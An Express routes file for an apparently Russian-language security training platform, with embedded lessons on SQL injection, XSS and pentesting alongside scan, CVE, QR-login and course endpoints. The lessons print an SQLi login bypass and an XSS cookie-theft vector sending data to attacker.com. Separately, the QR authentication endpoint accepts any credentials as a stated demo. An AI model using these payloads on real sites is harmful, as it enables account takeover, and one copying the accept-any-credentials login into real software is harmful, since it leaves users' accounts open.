import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import axios from 'axios';
import { storage } from "./storage";
import { api } from "@shared/routes";
import { setupAuth } from "./auth";
import { z } from "zod";
import OpenAI from "openai";
import { cveService } from "./cve-service";
import { websiteVerificationService } from "./website-verification";
import { qrAuthService } from "./qr-auth";
import { scannerService } from "./scanner-service";
import { arenaService } from "./arena-service";

// Initialize OpenAI client
// Note: In Replit, if the OpenAI integration is active, 
// the OPENAI_API_KEY env var is set automatically.
let openai: any = null;

if (process.env.OPENAI_API_KEY || process.env.AI_INTEGRATIONS_OPENAI_API_KEY) {
  openai = new OpenAI({ 
    apiKey: process.env.OPENAI_API_KEY || process.env.AI_INTEGRATIONS_OPENAI_API_KEY,
    baseURL: process.env.AI_INTEGRATIONS_OPENAI_BASE_URL
  });
} else {
  console.log("⚠️  No OpenAI API key found, AI features will be disabled");
}

import { seedDatabase } from "./seed";

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  // Initialize QR Auth WebSocket server
  qrAuthService.initializeWebSocketServer(httpServer);

  // Seed data on startup
  seedDatabase().catch(console.error);

  setupAuth(app);

  // --- COURSES DATA ---
  const COURSES = [
    {
      id: 1,
      title: "Web Security Deep Dive",
      description: "Глубокое погружение в безопасность веб-приложений: SQLi, XSS, CSRF и многое другое.",
      category: "Web Security",
      level: "intermediate",
      duration: "10 часов",
      icon: "Shield",
      image: "/course_web_security_banner_1777042956622.png",
      color: "from-emerald-500/20 to-cyan-500/20",
      skills: ["SQLi", "XSS", "Auth", "Security Headers"],
      lessons: [
        { 
          id: 1, 
          title: "Введение в Web Security", 
          duration: "15 мин", 
          content: `
            <img src="/course_web_security_banner_1777042956622.png" class="w-full rounded-xl mb-6 border border-primary/20 shadow-lg" />
            <h2 class="text-2xl text-primary mb-4 font-display">Основы безопасности веб-приложений</h2>
            <p className="text-gray-300 leading-relaxed mb-4">Безопасность веб-приложений — это раздел информационной безопасности, имеющий дело с безопасностью веб-сайтов, веб-приложений и веб-сервисов. На базовом уровне безопасность веб-приложений опирается на принципы веб-разработки на стороне клиента и сервера.</p>
            
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 my-8">
              <div class="bg-primary/10 p-4 rounded-lg border border-primary/20">
                <h4 class="text-primary font-bold mb-2">Конфиденциальность</h4>
                <p class="text-sm text-gray-400">Гарантия того, что данные доступны только авторизованным пользователям.</p>
              </div>
              <div class="bg-primary/10 p-4 rounded-lg border border-primary/20">
                <h4 class="text-primary font-bold mb-2">Целостность</h4>
                <p class="text-sm text-gray-400">Защита данных от несанкционированного изменения или удаления.</p>
              </div>
            </div>

            <h3 class="text-xl text-white mb-3">OWASP Top 10: Золотой стандарт</h3>
            <p class="text-gray-400 mb-4">OWASP Top 10 — это стандартный документ по повышению осведомленности для разработчиков и специалистов по безопасности веб-приложений. Он представляет собой широкое согласие относительно наиболее критических рисков безопасности для веб-приложений.</p>
            
            <div class="bg-black/40 border-l-4 border-accent p-6 my-6 italic text-gray-300">
              "Безопасность — это не конечная точка, а непрерывный процесс адаптации и обучения."
            </div>

            <h3 class="text-xl text-white mb-3">Архитектура современного веба</h3>
            <p class="text-gray-400 mb-4">Прежде чем ломать, нужно понять, как это работает. Современный стек обычно включает:</p>
            <ul class="list-disc list-inside space-y-2 text-gray-400 mb-6">
              <li><strong>Frontend:</strong> React, Vue, Angular (обработка данных на клиенте)</li>
              <li><strong>API Layer:</strong> REST, GraphQL (прослойка передачи данных)</li>
              <li><strong>Backend:</strong> Node.js, Python, Go (бизнес-логика)</li>
              <li><strong>Database:</strong> PostgreSQL, MongoDB, Redis (хранение)</li>
            </ul>

            <h3 class="text-xl text-white mb-3">Векторы атак</h3>
            <p class="text-gray-400 mb-6">Атаки могут быть направлены на любой из этих уровней. В этом курсе мы разберем наиболее опасные из них.</p>
          `
        },
        { 
          id: 2, 
          title: "Анализ SQL-инъекций", 
          duration: "45 мин", 
          content: `
            <p className="text-gray-300 mb-4">SQLi позволяет атакующему вмешаться в запросы, которые приложение делает к своей базе данных. Это одна из старейших, но все еще крайне опасных уязвимостей.</p>
            
            <div class="bg-black/60 p-6 rounded-lg font-mono border border-primary/20 mb-8 shadow-inner">
              <div class="text-primary/40 mb-2">// Уязвимый PHP код</div>
              <div class="text-white">
                $query = "SELECT * FROM users WHERE username = '" . $_POST['user'] . "';";<br/>
                $db->execute($query);
              </div>
            </div>

            <h3 class="text-xl text-white mb-3">Механика атаки</h3>
            <p class="text-gray-400 mb-4">Атакующий вводит <code class="text-accent font-mono">admin' --</code> в поле имени пользователя. Результирующий запрос превращается в:</p>
            <pre class="bg-black/60 p-4 rounded-lg font-mono text-emerald-400 border border-primary/20 mb-6">
              SELECT * FROM users WHERE username = 'admin' --';
            </pre>
            <p class="text-gray-400 mb-6">Символы <code class="text-primary font-mono">--</code> комментируют остальную часть SQL-запроса, позволяя войти без пароля.</p>

            <h3 class="text-xl text-white mb-3">Типы SQL инъекций</h3>
            <div class="space-y-4 mb-8">
              <div class="p-4 bg-slate-800/40 border border-primary/10 rounded-lg">
                <h4 class="text-primary font-bold mb-1">In-band SQLi (Classic)</h4>
                <p class="text-sm text-gray-400">Атакующий использует один и тот же канал связи для запуска атаки и сбора результатов. Включает Error-based и Union-based атаки.</p>
              </div>
              <div class="p-4 bg-slate-800/40 border border-primary/10 rounded-lg">
                <h4 class="text-primary font-bold mb-1">Inferential SQLi (Blind)</h4>
                <p class="text-sm text-gray-400">Данные не передаются напрямую. Атакующий восстанавливает структуру данных, отправляя полезную нагрузку и наблюдая за реакцией сервера (Boolean-based или Time-based).</p>
              </div>
              <div class="p-4 bg-slate-800/40 border border-primary/10 rounded-lg">
                <h4 class="text-primary font-bold mb-1">Out-of-band SQLi</h4>
                <p class="text-sm text-gray-400">Используется, когда сервер не может вернуть результат напрямую. Результаты отправляются на внешний сервер по DNS или HTTP.</p>
              </div>
            </div>

            <h3 class="text-xl text-white mb-3">Как защититься на 100%?</h3>
            <p class="text-gray-400 mb-4">Единственный правильный способ — использование параметризованных запросов (Prepared Statements).</p>
            <div class="bg-black/60 p-6 rounded-lg font-mono border border-primary/20 mb-8">
              <div class="text-emerald-500/40 mb-2">// Безопасный код (PDO)</div>
              <div class="text-white">
                $stmt = $pdo->prepare('SELECT * FROM users WHERE username = :user');<br/>
                $stmt->execute(['user' => $_POST['user']]);<br/>
                $user = $stmt->fetch();
              </div>
            </div>
          `
        },
        { 
          id: 3, 
          title: "XSS: Cross-Site Scripting", 
          duration: "50 мин", 
          content: `
            <h2 class="text-2xl text-primary mb-4 font-display">XSS: Межсайтовый скриптинг</h2>
            <p className="text-gray-300 mb-4">XSS позволяет атакующему внедрить вредоносный скрипт в веб-страницу, просматриваемую другими пользователями. Это атака на пользователя, а не на сервер.</p>
            
            <div class="bg-red-500/10 border border-red-500/30 p-6 rounded-lg mb-8">
              <h4 class="text-red-400 font-bold mb-2">Опасный вектор:</h4>
              <code class="text-white font-mono">&lt;script&gt;fetch('http://attacker.com/steal?cookie=' + document.cookie)&lt;/script&gt;</code>
            </div>

            <h3 class="text-xl text-white mb-3">Глубокое погружение в типы XSS</h3>
            <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
              <div class="p-4 bg-slate-800/40 border border-primary/10 rounded-lg">
                <h4 class="text-primary font-bold mb-1">Stored</h4>
                <p class="text-xs text-gray-400">Скрипт навсегда сохраняется на целевом сервере, например, в базе данных комментариев или в профиле пользователя.</p>
              </div>
              <div class="p-4 bg-slate-800/40 border border-primary/10 rounded-lg">
                <h4 class="text-primary font-bold mb-1">Reflected</h4>
                <p class="text-xs text-gray-400">Скрипт «отражается» от веб-приложения обратно в браузер пользователя. Обычно доставляется через ссылку.</p>
              </div>
              <div class="p-4 bg-slate-800/40 border border-primary/10 rounded-lg">
                <h4 class="text-primary font-bold mb-1">DOM-based</h4>
                <p class="text-xs text-gray-400">Уязвимость существует полностью на стороне клиента. Скрипт выполняется при изменении DOM-дерева.</p>
              </div>
            </div>

            <h3 class="text-xl text-white mb-3">Последствия XSS</h3>
            <ul class="list-disc list-inside space-y-2 text-gray-400 mb-8">
              <li>Кража сессионных куки (Session Hijacking)</li>
              <li>Фишинг на лету (изменение форм ввода)</li>
              <li>Майнинг криптовалют в браузере</li>
              <li>Перенаправление на вредоносные сайты</li>
            </ul>

            <h3 class="text-xl text-white mb-3">Стратегии защиты</h3>
            <p class="text-gray-400 mb-4">Для защиты от XSS необходимо использовать комплексный подход:</p>
            <ol class="list-decimal list-inside space-y-3 text-gray-400">
              <li><strong>Экранирование вывода (Context-aware Encoding):</strong> Кодируйте все данные перед вставкой в HTML.</li>
              <li><strong>Content Security Policy (CSP):</strong> Мощный HTTP-заголовок, ограничивающий источники скриптов.</li>
              <li><strong>Флаг HttpOnly:</strong> Запрещает JavaScript доступ к куки.</li>
            </ol>
          `
        },
        { 
          id: 4, 
          title: "Защита и DevSecOps", 
          duration: "30 мин", 
          content: `
            <h2 class="text-2xl text-primary mb-4 font-display">Безопасная разработка</h2>
            <p className="text-gray-300 mb-4">Безопасность должна быть частью жизненного цикла разработки, а не надстройкой в конце.</p>
            <img src="/course_web_security_banner_1777042956622.png" class="w-full rounded-xl my-6 border border-primary/20 opacity-50" />
            <p class="text-gray-400 italic">"Security is a process, not a product." - Bruce Schneier</p>
          `
        }
      ],
      progress: 0,
      completedLessons: 0,
      totalLessons: 4,
      started: false
    },
    {
      id: 2,
      title: "Penetration Testing Fundamentals",
      description: "Основы тестирования на проникновение и этичного хакинга.",
      category: "PenTest",
      level: "beginner",
      duration: "15 часов",
      icon: "Terminal",
      image: "/course_pentest_banner_1777043038291.png",
      color: "from-blue-500/20 to-indigo-500/20",
      skills: ["Nmap", "Metasploit", "Recon", "Enumeration"],
      lessons: [
        { 
          id: 1, 
          title: "Сбор информации (Recon)", 
          duration: "30 мин", 
          content: `
            <img src="/course_pentest_banner_1777043038291.png" class="w-full rounded-xl mb-6 border border-primary/20 shadow-lg" />
            <h2 class="text-2xl text-primary mb-4 font-display">Этап 1: Разведка</h2>
            <p class="text-gray-300 mb-4">Без качественной разведки взлом невозможен. Мы делим разведку на активную и пассивную.</p>
          `
        },
        { 
          id: 2, 
          title: "Сканирование портов (Nmap)", 
          duration: "40 мин", 
          content: `
            <h2 class="text-2xl text-primary mb-4 font-display">Nmap: Глаза пентестера</h2>
            <p class="text-gray-300 mb-4">Nmap (Network Mapper) — это мощный инструмент для исследования сети и аудита безопасности.</p>
            <pre class="bg-black/60 p-4 rounded-lg font-mono text-primary border border-primary/20 mb-6">
              nmap -sC -sV -oN scan_results.txt 192.168.1.1
            </pre>
            <p class="text-gray-400">В этом уроке мы разберем флаги сканирования и интерпретацию результатов.</p>
          `
        },
        { 
          id: 3, 
          title: "Эксплуатация уязвимостей", 
          duration: "60 мин", 
          content: `
            <h2 class="text-2xl text-primary mb-4 font-display">Metasploit Framework</h2>
            <p class="text-gray-300 mb-4">Переход от сканирования к получению доступа. Этичное использование эксплойтов.</p>
            <img src="/course_pentest_banner_1777043038291.png" class="w-full rounded-xl my-6 border border-primary/20" />
          `
        }
      ],
      progress: 0,
      completedLessons: 0,
      totalLessons: 3,
      started: false
    },
    {
      id: 3,
      title: "Cryptography & Data Protection",
      description: "Современные методы шифрования и защиты данных.",
      category: "Security",
      level: "advanced",
      duration: "12 часов",
      icon: "Key",
      image: "/course_crypto_banner_1777043066822.png",
      color: "from-purple-500/20 to-pink-500/20",
      skills: ["AES", "RSA", "ECC", "Hashing"],
      lessons: [
        { 
          id: 1, 
          title: "Симметричное шифрование", 
          duration: "20 мин", 
          content: `
            <img src="/course_crypto_banner_1777043066822.png" class="w-full rounded-xl mb-6 border border-primary/20 shadow-lg" />
            <h2 class="text-2xl text-primary mb-4 font-display">Алгоритм AES</h2>
            <p class="text-gray-300 mb-4">Advanced Encryption Standard — золотой стандарт симметричного шифрования.</p>
          `
        }
      ],
      progress: 0,
      completedLessons: 0,
      totalLessons: 1,
      started: false
    }
  ];

  // === AUTH ===
  app.get(api.auth.me.path, (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(200).json(null); // Return null for not logged in, but 200 OK
    }
    res.json(req.user);
  });

  // === SCANS ===
  app.post(api.scans.create.path, async (req, res) => {
    if (!req.isAuthenticated()) return res.sendStatus(401);

    try {
      const input = api.scans.create.input.parse(req.body);

      // Perform REAL scan using the new service
      const analysisResult = await scannerService.performScan(input.target, input.scanType);

      const scan = await storage.createScan({
        target: input.target,
        scanType: input.scanType,
        result: analysisResult,
        vulnerabilityCount: analysisResult.vulnerabilities.length,
        isSafe: analysisResult.isSafe,
        userId: (req.user as any).id,
      });

      res.status(200).json(scan);
    } catch (err) {
      if (err instanceof z.ZodError) {
        return res.status(400).json({
          message: err.errors[0].message,
          field: err.errors[0].path.join('.'),
        });
      }
      console.error(err);
      res.status(500).json({ message: "Internal Server Error" });
    }
  });

  app.get(api.scans.list.path, async (req, res) => {
    if (!req.isAuthenticated()) return res.sendStatus(401);
    const scans = await storage.getScansByUser((req.user as any).id);
    res.json(scans);
  });

  app.get(api.scans.get.path, async (req, res) => {
    if (!req.isAuthenticated()) return res.sendStatus(401);
    const scan = await storage.getScan(Number(req.params.id));
    if (!scan) return res.status(404).json({ message: "Scan not found" });
    if (scan.userId !== (req.user as any).id) return res.sendStatus(403);
    res.json(scan);
  });

  // === CVE ENDPOINTS ===
  app.get('/api/cves/recent', async (req, res) => {
    try {
      const limit = parseInt(req.query.limit as string) || 10;
      const cves = await cveService.getRecentCVEs(limit);
      res.json(cves);
    } catch (error) {
      console.error('Error fetching recent CVEs:', error);
      res.status(500).json({ message: 'Failed to fetch CVEs' });
    }
  });

  app.get('/api/cves/stats', async (req, res) => {
    try {
      const stats = await cveService.getCVEStats();
      res.json(stats);
    } catch (error) {
      console.error('Error fetching CVE stats:', error);
      res.status(500).json({ message: 'Failed to fetch CVE stats' });
    }
  });

  app.get('/api/cves/search', async (req, res) => {
    try {
      const keyword = req.query.keyword as string;
      const limit = parseInt(req.query.limit as string) || 20;
      
      if (!keyword) {
        return res.status(400).json({ message: 'Keyword is required' });
      }
      
      const cves = await cveService.searchCVEs(keyword, limit);
      res.json(cves);
    } catch (error) {
      console.error('Error searching CVEs:', error);
      res.status(500).json({ message: 'Failed to search CVEs' });
    }
  });

  // === CVE DETAIL ENDPOINT ===
  app.get('/api/cves/:cveId', async (req, res) => {
    try {
      const { cveId } = req.params;
      
      // Fetch CVE from NVD API
      const url = `https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=${cveId}`;
      const response = await axios.get(url, {
        headers: { 'User-Agent': 'SecOps-Global-Scanner/1.0' },
        timeout: 10000
      });

      const vuln = response.data.vulnerabilities?.[0];
      if (!vuln) {
        return res.status(404).json({ message: 'CVE not found' });
      }

      const cve = vuln.cve;
      const cvssScore = cve.metrics?.cvssMetricV31?.[0]?.cvssData?.baseScore || 
                       cve.metrics?.cvssMetricV30?.[0]?.cvssData?.baseScore || 
                       cve.metrics?.cvssMetricV2?.[0]?.cvssData?.baseScore || 0;

      const severity = cvssScore >= 9.0 ? 'critical' : cvssScore >= 7.0 ? 'high' : cvssScore >= 4.0 ? 'medium' : 'low';

      // Build base CVE data
      const cveData: any = {
        id: cve.id,
        severity,
        description: cve.descriptions?.find((d: any) => d.lang === 'en')?.value || 'No description available',
        affected: cve.configurations?.[0]?.nodes?.[0]?.cpeMatch?.map((match: any) => {
          const parts = match.criteria.split(':');
          return parts.length >= 5 ? `${parts[3]} ${parts[4]}` : match.criteria;
        }).slice(0, 3).join(', ') || 'Unknown software',
        published: cve.published?.split('T')[0] || new Date().toISOString().split('T')[0],
        modified: cve.lastModified?.split('T')[0] || new Date().toISOString().split('T')[0],
        cvss: cvssScore,
        references: cve.references?.map((ref: any) => ref.url) || [],
        cwe: cve.weaknesses?.map((w: any) => w.description?.[0]?.value) || ['CWE-Unknown']
      };

      // Generate AI explanation if OpenAI is available
      if (openai) {
        try {
          const aiResponse = await openai.chat.completions.create({
            model: "gpt-4o-mini",
            messages: [
              { 
                role: "system", 
                content: "You are a cybersecurity expert. Provide detailed technical analysis of CVE vulnerabilities in Russian language." 
              },
              { 
                role: "user", 
                content: `Analyze this CVE and provide detailed explanation in Russian:
                
CVE ID: ${cveData.id}
Severity: ${severity}
CVSS Score: ${cvssScore}
Description: ${cveData.description}
Affected: ${cveData.affected}

Provide JSON with:
{
  "summary": "Brief summary of the vulnerability in Russian (2-3 sentences)",
  "technicalDetails": "Technical explanation of how the attack works in Russian",
  "impact": "Description of potential impact and risks in Russian",
  "affectedSystems": ["List of 4-5 specific system types that are vulnerable"],
  "mitigationSteps": ["5 specific actionable steps to fix/mitigate"],
  "preventionTips": ["5 best practices to prevent similar vulnerabilities"]
}` 
              }
            ],
            response_format: { type: "json_object" }
          });

          const aiContent = aiResponse.choices[0].message.content;
          if (aiContent) {
            const aiData = JSON.parse(aiContent);
            cveData.aiExplanation = aiData;
          }
        } catch (aiError) {
          console.error('AI explanation generation failed:', aiError);
        }
      }

      res.json(cveData);
    } catch (error) {
      console.error('Error fetching CVE details:', error);
      res.status(500).json({ message: 'Failed to fetch CVE details' });
    }
  });

  // === WEBSITE VERIFICATION ===
  app.post('/api/verification/generate-code', (req, res) => {
    const code = websiteVerificationService.generateVerificationCode();
    const instructions = websiteVerificationService.getVerificationInstructions(code);
    res.json({ code, instructions });
  });

  app.post('/api/verification/verify', async (req, res) => {
    try {
      const { url, verificationCode } = req.body;
      
      if (!url || !verificationCode) {
        return res.status(400).json({ message: 'URL and verification code are required' });
      }
      
      const result = await websiteVerificationService.verifyWebsiteOwnership(url, verificationCode);
      res.json(result);
    } catch (error) {
      console.error('Error verifying website:', error);
      res.status(500).json({ message: 'Failed to verify website' });
    }
  });

  // === QR AUTH ENDPOINTS ===
  app.post('/api/qr/generate', (req, res) => {
    try {
      const session = qrAuthService.generateSession();
      const baseUrl = process.env.BASE_URL || `${req.protocol}://${req.get('host')}`;
      const authUrl = `${baseUrl}/auth/qr?sessionId=${session.sessionId}`;
      
      res.json({
        sessionId: session.sessionId,
        expiresAt: session.expiresAt,
        authUrl: authUrl,
        qrData: authUrl // QR code now contains direct URL
      });
    } catch (error) {
      console.error('Error generating QR session:', error);
      res.status(500).json({ message: 'Failed to generate QR session' });
    }
  });

  app.get('/api/qr/status/:sessionId', (req, res) => {
    try {
      const { sessionId } = req.params;
      const session = qrAuthService.getSession(sessionId);
      
      if (!session) {
        return res.status(404).json({ message: 'Session not found' });
      }
      
      res.json({
        sessionId: session.sessionId,
        status: session.status,
        username: session.username,
        createdAt: session.createdAt,
        expiresAt: session.expiresAt
      });
    } catch (error) {
      console.error('Error getting QR session status:', error);
      res.status(500).json({ message: 'Failed to get session status' });
    }
  });

  app.post('/api/qr/status/:sessionId', (req, res) => {
    try {
      const { sessionId } = req.params;
      const { action } = req.body;
      
      const session = qrAuthService.getSession(sessionId);
      if (!session) {
        return res.status(404).json({ message: 'Session not found' });
      }
      
      if (action === 'scan') {
        qrAuthService.updateSessionStatus(sessionId, 'scanned');
        res.json({ success: true, message: 'Scan simulated successfully' });
      } else {
        res.status(400).json({ message: 'Invalid action' });
      }
    } catch (error) {
      console.error('Error updating QR session status:', error);
      res.status(500).json({ message: 'Failed to update session status' });
    }
  });

  app.post('/api/qr/authenticate/:sessionId', (req, res) => {
    try {
      const { sessionId } = req.params;
      const { username, password } = req.body;
      
      const session = qrAuthService.getSession(sessionId);
      if (!session) {
        return res.status(404).json({ message: 'Session not found or expired' });
      }
      
      if (session.status !== 'scanned') {
        return res.status(400).json({ message: 'Session not scanned yet' });
      }
      
      // Validate credentials (in real app, check against database)
      // For demo, we'll accept any credentials
      qrAuthService.updateSessionStatus(sessionId, 'authenticated', {
        username,
        userId: Math.floor(Math.random() * 1000) + 1
      });
      
      res.json({
        success: true,
        message: 'Authentication successful',
        username
      });
    } catch (error) {
      console.error('Error authenticating QR session:', error);
      res.status(500).json({ message: 'Authentication failed' });
    }
  });

  app.post('/api/qr/verify-link/:sessionId', async (req, res) => {
    try {
      const { sessionId } = req.params;
      
      const session = qrAuthService.getSession(sessionId);
      if (!session) {
        return res.status(404).json({ message: 'Session not found or expired' });
      }
      
      // If user is authenticated via session cookie, auto-approve
      if (req.isAuthenticated() && req.user) {
        qrAuthService.updateSessionStatus(sessionId, 'authenticated', {
          userId: (req.user as any).id,
          username: (req.user as any).username
        });
        
        return res.json({
          success: true,
          status: 'authenticated',
          message: 'Authentication successful',
          user: {
            id: (req.user as any).id,
            username: (req.user as any).username
          }
        });
      }
      
      // Just mark as scanned - waiting for auth
      if (session.status === 'pending') {
        qrAuthService.updateSessionStatus(sessionId, 'scanned');
      }
      
      res.json({
        success: true,
        status: session.status,
        message: 'Session updated',
        requiresAuth: true
      });
    } catch (error) {
      console.error('Error verifying QR link:', error);
      res.status(500).json({ message: 'Failed to verify QR link' });
    }
  });
  app.get(api.stats.get.path, async (req, res) => {
    if (!req.isAuthenticated()) return res.sendStatus(401);
    const stats = await storage.getStats((req.user as any).id);
    res.json(stats);
  });

  // === COURSES ENDPOINTS ===
  app.get('/api/courses', async (req, res) => {
    // If authenticated, we could merge user progress here
    res.json(COURSES);
  });

  app.get('/api/courses/:id', async (req, res) => {
    const course = COURSES.find(c => c.id === Number(req.params.id));
    if (!course) return res.status(404).json({ message: "Course not found" });
    res.json(course);
  });

  // === ARENA ENDPOINTS ===
  app.post('/api/arena/join', async (req, res) => {
    if (!req.isAuthenticated()) return res.sendStatus(401);
    const { challengeId } = req.body;
    const session = await arenaService.startChallenge((req.user as any).id, challengeId);
    res.json(session);
  });

  app.get('/api/arena/sessions', async (req, res) => {
    if (!req.isAuthenticated()) return res.sendStatus(401);
    const sessions = await storage.getArenaSessions((req.user as any).id);
    res.json(sessions);
  });

  app.post('/api/arena/submit', async (req, res) => {
    if (!req.isAuthenticated()) return res.sendStatus(401);
    const { sessionId, flag } = req.body;
    const isCorrect = await arenaService.submitFlag((req.user as any).id, sessionId, flag);
    res.json({ success: isCorrect });
  });

  // === COURSE PROGRESS ENDPOINTS ===
  app.get('/api/courses/:courseId/progress', async (req, res) => {
    if (!req.isAuthenticated()) return res.sendStatus(401);
    const progress = await storage.getProgress((req.user as any).id, Number(req.params.courseId));
    res.json(progress);
  });

  app.post('/api/courses/:courseId/lessons/:lessonId/complete', async (req, res) => {
    if (!req.isAuthenticated()) return res.sendStatus(401);
    const progress = await storage.updateProgress(
      (req.user as any).id, 
      Number(req.params.courseId), 
      req.params.lessonId, 
      true
    );
    res.json(progress);
  });

  // === COMMENT ENDPOINTS ===
  app.get('/api/courses/:courseId/lessons/:lessonId/comments', async (req, res) => {
    const comments = await storage.getComments(Number(req.params.courseId), req.params.lessonId);
    res.json(comments);
  });

  app.post('/api/courses/:courseId/lessons/:lessonId/comments', async (req, res) => {
    if (!req.isAuthenticated()) return res.sendStatus(401);
    const { content } = req.body;
    const comment = await storage.addComment((req.user as any).id, Number(req.params.courseId), req.params.lessonId, content);
    res.json(comment);
  });

  // === USER SETTINGS ENDPOINTS ===
  app.get('/api/user/settings', async (req, res) => {
    if (!req.isAuthenticated()) return res.sendStatus(401);
    const settings = await storage.getUserSettings((req.user as any).id);
    res.json(settings || {});
  });

  app.post('/api/user/settings', async (req, res) => {
    if (!req.isAuthenticated()) return res.sendStatus(401);
    const settings = await storage.updateUserSettings((req.user as any).id, req.body);
    res.json(settings);
  });

  return httpServer;
}
